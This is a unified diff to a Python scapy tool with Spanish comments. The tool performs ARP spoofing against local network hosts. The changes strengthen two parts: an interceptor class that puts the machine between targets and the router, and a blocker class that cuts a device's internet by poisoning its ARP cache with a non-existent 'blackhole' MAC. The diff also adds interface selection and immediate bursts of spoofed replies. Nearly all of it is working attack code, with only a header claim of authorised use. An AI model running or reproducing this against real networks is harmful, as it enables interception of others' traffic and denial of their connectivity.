@@ -15,18 +15,55 @@ Diseno "bien hecho", no de prueba:
 USO LEGAL: solo en redes que administras o donde tienes permiso explicito.
 """
 
+import re
 import time
 import platform
 import subprocess
 import threading
 import atexit
 
+_IS_WIN = platform.system() == "Windows"
+_NO_WINDOW = 0x08000000 if _IS_WIN else 0
 
-def _send_arp(**fields):
-    """Envia una respuesta ARP como trama Ethernet unicast."""
+# MAC "agujero negro": localmente administrada y que NO existe en la LAN. El
+# bloqueo le dice al objetivo que el router esta en esta MAC inexistente, asi sus
+# tramas al router se pierden en el switch. Ventaja clave: NO depende del reenvio
+# de IP del sistema (que en Windows a veces exige reiniciar), asi el bloqueo
+# funciona aunque haya una intercepcion activa (que si necesita reenvio ON).
+BLACKHOLE_MAC = "02:00:00:00:5e:00"
+
+
+def _send_arp(iface=None, **fields):
+    """Envia una respuesta ARP como trama Ethernet unicast (por la interfaz
+    correcta si se indica, para no salir por un adaptador virtual)."""
     from scapy.all import ARP, Ether, sendp
     destination = fields.get("hwdst")
-    sendp(Ether(dst=destination) / ARP(**fields), verbose=0)
+    pkt = Ether(dst=destination) / ARP(**fields)
+    if iface:
+        sendp(pkt, iface=iface, verbose=0)
+    else:
+        sendp(pkt, verbose=0)
+
+
+def _mac_from_arp(ip):
+    """Lee la MAC de la tabla ARP del sistema. Fallback fiable cuando scapy no
+    resuelve (p.ej. envio por el adaptador equivocado): el SO ya la tiene en
+    cache tras el escaneo ARP inicial."""
+    try:
+        if _IS_WIN:
+            out = subprocess.run(["arp", "-a", ip], capture_output=True,
+                                 text=True, timeout=4,
+                                 creationflags=_NO_WINDOW).stdout
+        else:
+            out = subprocess.run(["arp", "-n", ip], capture_output=True,
+                                 text=True, timeout=4).stdout
+    except Exception:
+        return None
+    m = re.search(r"([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", out or "")
+    if not m:
+        return None
+    mac = m.group(0).replace("-", ":").lower()
+    return None if mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00") else mac
 
 
 # --------------------------------------------------------------------------- #
@@ -121,6 +158,7 @@ class Interceptor:
         self.gateway_ip = None
         self.gateway_mac = None
         self.my_mac = None
+        self.iface = None
         self._running = False
         self._thread = None
         self._lock = threading.Lock()
@@ -128,16 +166,17 @@ class Interceptor:
     # -- helpers scapy (import perezoso: no rompe si scapy/npcap falta) ------ #
     @staticmethod
     def _mac_of(ip, retries=3):
+        """MAC de una IP local. Intenta scapy y, si falla, la tabla ARP del SO."""
         from scapy.all import getmacbyip
         for _ in range(retries):
             try:
                 mac = getmacbyip(ip)
                 if mac:
-                    return mac
+                    return mac.lower()
             except Exception:
                 pass
-            time.sleep(0.4)
-        return None
+            time.sleep(0.3)
+        return _mac_from_arp(ip)
 
     def detect_gateway(self):
         from scapy.all import conf
@@ -146,18 +185,25 @@ class Interceptor:
 
     def _setup(self):
         from scapy.all import conf, get_if_hwaddr
-        self.gateway_ip = self.detect_gateway()
+        # La ruta por defecto nos da LA interfaz con salida a internet: la usamos
+        # para enviar por el adaptador correcto (en Windows con VPN/WSL/etc.
+        # conf.iface suele apuntar al equivocado y el spoof no llega).
+        iface, _out_ip, gw = conf.route.route("0.0.0.0")
+        self.iface = iface
+        self.gateway_ip = gw
         self.gateway_mac = self._mac_of(self.gateway_ip)
         try:
-            self.my_mac = get_if_hwaddr(conf.iface)
+            self.my_mac = get_if_hwaddr(iface)
         except Exception:
             self.my_mac = None
         if not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del router (gateway).")
 
     # -- objetivos ---------------------------------------------------------- #
-    def add_target(self, ip):
-        mac = self._mac_of(ip)
+    def add_target(self, ip, mac=None):
+        """Anade un objetivo. Si se pasa la MAC ya conocida (del escaneo), se usa
+        directamente: mucho mas fiable que re-resolverla en el momento."""
+        mac = (mac or "").lower() or self._mac_of(ip)
         if not mac:
             return False
         with self._lock:
@@ -166,8 +212,10 @@ class Interceptor:
         if self.gateway_ip and self.gateway_mac:
             try:
                 for _ in range(3):
-                    _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
-                    _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip)
+                    _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
+                              psrc=self.gateway_ip)
+                    _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
+                              hwdst=self.gateway_mac, psrc=ip)
                     time.sleep(0.2)
             except Exception:
                 pass
@@ -193,17 +241,19 @@ class Interceptor:
             items = list(self.targets.items())
         for ip, mac in items:
             # Al objetivo: "yo (router) estoy en mi_mac"
-            _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
+            _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
+                      psrc=self.gateway_ip)
             # Al router: "yo (objetivo) estoy en mi_mac"
-            _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip)
+            _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
+                      hwdst=self.gateway_mac, psrc=ip)
 
     def _restore(self, ip, mac):
         """Reenvia las asociaciones ARP correctas para sanar la red."""
         for _ in range(5):
-            _send_arp(op=2, pdst=ip, hwdst=mac,
+            _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                       psrc=self.gateway_ip, hwsrc=self.gateway_mac)
-            _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
-                      psrc=ip, hwsrc=mac)
+            _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
+                      hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
             time.sleep(0.2)
 
     # -- ciclo de vida ------------------------------------------------------ #
@@ -249,38 +299,53 @@ interceptor = Interceptor()
 # =========================================================================== #
 class Blocker:
     """
-    Bloquea el acceso a internet de un equipo: le dice (por ARP) que el router
-    esta en la MAC de este equipo, pero NO reenvia -> su trafico al router se
-    pierde. Se revierte al desbloquear o cerrar.
+    Bloquea el acceso a internet de un equipo por ARP spoofing "agujero negro":
+    le dice al objetivo que el router esta en una MAC INEXISTENTE, asi sus tramas
+    al router se pierden en el switch. Se revierte al desbloquear o cerrar.
+
+    Antes se apoyaba en apagar el reenvio de IP del sistema; eso chocaba con la
+    intercepcion (que lo necesita ENCENDIDO) y en Windows a veces exige reiniciar.
+    Con el agujero negro el bloqueo es independiente del reenvio: puedes bloquear
+    un equipo y estar inspeccionando otro a la vez sin que se pisen.
     """
     def __init__(self):
         self.targets = {}       # ip -> mac
         self.gateway_ip = None
         self.gateway_mac = None
+        self.iface = None
         self._running = False
         self._thread = None
         self._lock = threading.Lock()
 
     def _setup(self):
         from scapy.all import conf
-        self.gateway_ip = conf.route.route("0.0.0.0")[2]
+        iface, _out_ip, gw = conf.route.route("0.0.0.0")
+        self.iface = iface
+        self.gateway_ip = gw
         self.gateway_mac = Interceptor._mac_of(self.gateway_ip)
         if not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del router.")
 
-    def block(self, ip):
-        mac = Interceptor._mac_of(ip)
+    def block(self, ip, mac=None):
+        mac = (mac or "").lower() or Interceptor._mac_of(ip)
         if not mac:
             return False
         if not self._running:
             self._setup()
-            disable_ip_forwarding()   # importante: sin reenvio para que se corte
             self._running = True
             self._thread = threading.Thread(target=self._loop, daemon=True)
             self._thread.start()
             atexit.register(self.stop)
         with self._lock:
             self.targets[ip] = mac
+        # rafaga inmediata: el corte se nota al instante, no al siguiente ciclo
+        try:
+            for _ in range(4):
+                _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
+                          psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
+                time.sleep(0.15)
+        except Exception:
+            pass
         return True
 
     def unblock(self, ip):
@@ -288,7 +353,7 @@ class Blocker:
             mac = self.targets.pop(ip, None)
         if mac and self.gateway_ip and self.gateway_mac:
             for _ in range(5):
-                _send_arp(op=2, pdst=ip, hwdst=mac,
+                _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                           psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                 time.sleep(0.2)
         if not self.list_targets():
@@ -305,7 +370,8 @@ class Blocker:
                 items = list(self.targets.items())
             for ip, mac in items:
                 try:
-                    _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
+                    _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
+                              psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
                 except Exception:
                     pass
             time.sleep(1.2)
@@ -321,7 +387,7 @@ class Blocker:
             try:
                 for ip, mac in items:
                     for _ in range(5):
-                        _send_arp(op=2, pdst=ip, hwdst=mac,
+                        _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                                   psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                         time.sleep(0.1)
             except Exception:
